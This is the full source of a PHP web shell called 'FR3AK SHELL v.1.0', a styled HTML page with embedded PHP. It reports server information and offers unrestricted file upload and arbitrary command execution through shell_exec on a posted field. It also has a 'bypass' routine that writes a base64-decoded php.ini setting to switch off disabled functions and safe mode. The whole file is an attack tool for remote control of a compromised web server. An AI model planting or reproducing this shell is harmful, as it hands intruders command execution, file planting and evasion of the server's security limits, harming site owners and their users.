
<!DOCTYPE html>
<html>
<head>
	<title>FR3AK SHELL v.1.0</title>
	<style type="text/css">
	body{
		background-color: #7f8c8d;
	}
	#cmd{
		background-color: black;
		color: green;
		
	}
	#top-menu{
		background-color: black;
		color: #34495e;
		width: 100%;
		height: 45px;
		font-size: 42px;


	}
	#top-menu a{
		text-decoration: none;
		color: #34495e;
	}
	#top-menu a:hover{
		color: #3498db;
	}
	#center-div{
		font-size: 30px;
		color: blue;

	}
	#rodape{
		background-color: black;
		color: white;

	}
	#bp{
		color: red;
		font-size: 30px;
	}
	#cmd-2{
		border: none;
		background-color: gray;
		height: 40px;
		color: black;
		font-size: 35px;
		text-align: center;
	}
	#exc{
		border-radius: 10%;
		background-color: blue;
		border: none;
		height: 40px;
	

	}
	#form-cmd{
		font-size: 40px;
	}
</style>
</head>
<body>

<?php
	
	error_reporting(0);

	
	$act = $_GET['act'];
	/*informações do servidor */
	$sys = php_uname(); /*informações sobre o sistema operacional*/
	$disable_func = @ini_get('disable_functions'); /*funções desativadas*/
	$local = @getcwd(); /*diretorio atual*/
	$server_ip = gethostbyname($_SERVER['SERVER_NAME']); /*ip do servidor*/
	echo 'SERVER INFORMATION - '.$sys.'-'.PHP_OS.'<br>';
	echo 'LOCAL DIR: '.$local.'<br>';
	echo 'SERVER IP -'.$server_ip.'<br>';
	
	if($disable_func == ""){

		echo 'DISABLED FUNCTIONS: all functions are eneabled <br>';
	}else{
		echo"DISABLED FUNCTIONS: ".$disable_func; 
	}

	/*end*/

	//menu do topo

	echo "
		<div id='top-menu'>
		<center>	
			<a href='?act=upload'>upload</a> --
	 		<a href='?act=cmd'>cmd</a>--
		 	<a href='?act=bypass'>bypass disabled functions</a>
		 </center>
		 </div> <br>
		 	";

		 echo "<div id='center-div'>
		 <center>
		 ".$_SERVER['SERVER_NAME']."

		 </center>
		 </div>


		 ";
	//inicio das funções
	//functions


	//upload
	function upload()
	{
		echo '<center>
			<form enctype="multipart/form-data" action="?act=upload" method="post">
			<input type ="file" name="file" >
			<input type="submit">
			</form>
			</center>

		';

	}
	//command execution
	function command(){
		echo '<center>
		<div id="form-cmd">
		<form method= "post" action ="?act=cmd">
			'.$_SERVER['SERVER_NAME'].'@fr3ak~:$<br><input type ="text" name="comando" id="cmd-2"><br>
			<input type="submit" value="execute" id="exc">
		</div>
			</center>


		';
		$cmd = $_POST['comando'];
		if($cmd ==""){
			$cmd = 'ls';
		}
		echo "<div id='cmd'><pre>".shell_exec($cmd)."</pre></div>";

	}
		//BYPASS DISABLED FUNCTIONS
	function bypass_disabled(){

		$ini = base64_decode('ZGlzYWJsZV9mdW5jdGlvbnM9bm9uZSANCgkJc2FmZV9tb2RlID0gT2Zm');
		$php_ini =	fopen('php.ini', 'w');
		fwrite($php_ini, $ini);
		fclose($php_ini);
		echo "<center><div id='bp'>BYPASSED!</div></center>";
	}

		//END


	//CHAMADA DAS FUNÇÕES

	if($act == "upload"){
		upload();
		if (isset($_FILES['file'])) {
			
		}
		$dir ='./';
		$dir = $dir . basename( $_FILES['file']['name']);
		if(move_uploaded_file($_FILES['file']['tmp_name'], $dir)){
			echo "uploaded :D";
		}else{
			echo "not uploaded";
		}
	}
	if($act =="cmd"){
		command();
	}

	if ($act == "bypass") {
		bypass_disabled();
	}


?>
<br><br><br><br><br><br><br><br>
<div id="rodape">
	<center>
		FR3AK SHELL 1.0- BY: FR3AK 
	</center>
</div>
</body>	
</html>